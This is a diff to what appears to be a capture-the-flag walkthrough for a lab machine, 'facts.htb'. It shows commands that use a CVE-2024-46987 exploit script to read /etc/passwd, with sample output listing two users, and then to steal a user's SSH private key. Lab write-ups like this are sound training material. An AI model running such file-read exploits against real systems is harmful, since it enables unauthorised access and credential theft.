@@ -221,10 +221,20 @@ cd CVE-2024-46987
 Read sensitive files:
 
 ```bash
-# Read /etc/passwd to enumerate users
+# Step 1: Read /etc/passwd to enumerate system users
 python CVE-2024-46987.py -u http://facts.htb --user test123 -p test123 /etc/passwd
+```
 
-# Read trivia's SSH private key
+**Output (relevant lines):**
+```
+trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+william:x:1001:1001::/home/william:/bin/bash
+```
+
+Two users are identified: `trivia` and `william`. Since `trivia` has a login shell and a home directory, check for an SSH private key:
+
+```bash
+# Step 2: Read trivia's SSH private key
 python CVE-2024-46987.py -u http://facts.htb --user test123 -p test123 /home/trivia/.ssh/id_ed25519
 ```
 
